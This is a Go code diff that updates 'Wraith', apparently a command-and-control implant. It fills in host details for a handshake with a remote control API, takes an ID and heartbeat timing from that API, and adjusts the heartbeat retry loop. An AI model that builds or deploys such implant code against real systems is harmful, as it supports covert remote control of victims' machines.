@@ -20,6 +20,7 @@ import (
 	"os"
 	"strings"
 	"sync"
+	"runtime"
 	"time"
 
 	yaegi "./include/yaegi/interp"
@@ -128,7 +129,7 @@ type wraithStruct struct {
 	HeartbeatDelay           uint64     // The delay between each successful heartbeat
 	HandshakeReattemptDelay  uint64     // The delay between handshake reattempts if the failed heartbeat tolerance is exceeded
 	FailedHeartbeatTolerance uint64     // How many failed handshakes in a row until the connection is reset
-	Plugins                  []string   // List of all plugins included with this Wraith
+	//Plugins                  []string   // List of all plugins included with this Wraith
 	CommandQueue             []string   // A slice of the commands to be executed
 	CommandQueueMutex        sync.Mutex // A mutex preventing CommandQueue from being modified by multiple goroutines at the same time
 }
@@ -408,9 +409,9 @@ func (wraith *wraithStruct) Handshake() error {
 	data := map[string]interface{}{
 		"reqType": "handshake",
 		"hostInfo": map[string]interface{}{
-			"arch":       "",
+			"arch":       runtime.GOARCH,
 			"hostname":   hostname,
-			"osType":     "",
+			"osType":     runtime.GOOS,
 			"osVersion":  "",
 			"reportedIP": "",
 		},
@@ -425,8 +426,15 @@ func (wraith *wraithStruct) Handshake() error {
 		},
 	}
 
-	// Send the data
-	wraith.API(data)
+	// Send the data and receive the response
+	handshakeResult, handshakeErr := wraith.API(data)
+	if handshakeErr != nil {
+		return errors.New("error while completing handshake `"+fmt.Sprint(handshakeErr)+"`")
+	}
+
+	// Set the Wraith parameters received in the handshake
+	wraith.WraithID = handshakeResult["assignedID"].(string)
+	wraith.HeartbeatDelay = uint64(handshakeResult["baseHeartbeatDelay"].(float64))
 
 	return nil
 
@@ -471,14 +479,14 @@ func main() {
 	// Create an instace of Wraith
 	wraith := wraithStruct{}
 	// Set the Wraith properties to their defaults
-	wraith.WraithID = ""
+	wraith.WraithID = "" // To be set by the API on handshake
 	wraith.WraithStartTime = WraithStartTime
 	wraith.RunWraith = true
-	wraith.ControlAPIURL = ""
+	wraith.ControlAPIURL = "" // To be set after fetching from the hardcoded URL
 	wraith.APIRequestPrefix = setAPIREQPREFIX
 	wraith.TrustedAPIFingerprint = setTRUSTEDSERVERFINGERPRINT
 	wraith.CryptKey = setSECONDLAYERENCRYPTIONKEY
-	wraith.HeartbeatDelay = setDEFAULTHEARTBEATDELAYBASE
+	wraith.HeartbeatDelay = 0 // To be set by the API on handshake
 	wraith.HandshakeReattemptDelay = setDEFAULTHANDSHAKEREATTEMPTDELAY
 	wraith.FailedHeartbeatTolerance = setFAILEDHEARTBEATTOLERANCE
 	//wraith.Plugins = setPLUGINS
@@ -507,19 +515,19 @@ func main() {
 	// Counter for the number of failed heartbeats in a row. Initially set this
 	// to the maximum tolerated amount as the first handshake will always fail
 	// anyway due to the Wraith not being logged in
-	FailedHeartbeatCounter := wraith.FailedHeartbeatTolerance
+	failedHeartbeatCounter := wraith.FailedHeartbeatTolerance
 	// Main Wraith loop - run until exit flag on Wraith is set
 	for wraith.RunWraith {
 
 		// If the heartbeat failed for whatever reason
 		if heartbeatErr := wraith.Heartbeat(); heartbeatErr != nil {
 			// Increment the counter
-			FailedHeartbeatCounter++
-
-			dlog(3, "sending heartbeat to api at `"+wraith.ControlAPIURL+"` failed and the failed heartbeat tolerance was exceeded so retrying handshake")
+			failedHeartbeatCounter++
 
 			// If the counter exceeds the failed heartbeat tolerance
-			if FailedHeartbeatCounter > wraith.FailedHeartbeatTolerance {
+			if failedHeartbeatCounter > wraith.FailedHeartbeatTolerance {
+
+				dlog(3, "sending heartbeat to api at `"+wraith.ControlAPIURL+"` failed and the failed heartbeat tolerance was exceeded so retrying handshake")
 
 				// Reset the encryption key so we can communicate with the server
 				wraith.CryptKey = setSECONDLAYERENCRYPTIONKEY
@@ -550,6 +558,10 @@ func main() {
 				dlog(0, "handshake succeeded so sending heartbeat in `"+fmt.Sprint(nextHandshakeDelay)+"` seconds")
 				time.Sleep(time.Duration(nextHandshakeDelay) * time.Second)
 
+				// Reset the failed heartbeat counter since a successful handshake somewhat counts as
+				// a heartbeat
+				failedHeartbeatCounter = 0
+
 			} else {
 				// If the heartbeat failed but the failed heartbeat tolerance was
 				// not exceeded, wait then retry
@@ -562,7 +574,7 @@ func main() {
 
 		} else {
 			// If the heartbeat succeeded, reset the fail counter
-			FailedHeartbeatCounter = 0
+			failedHeartbeatCounter = 0
 
 			// And log the successful heartbeat
 			dlog(0, "successful heartbeat with api at `"+wraith.ControlAPIURL+"`")
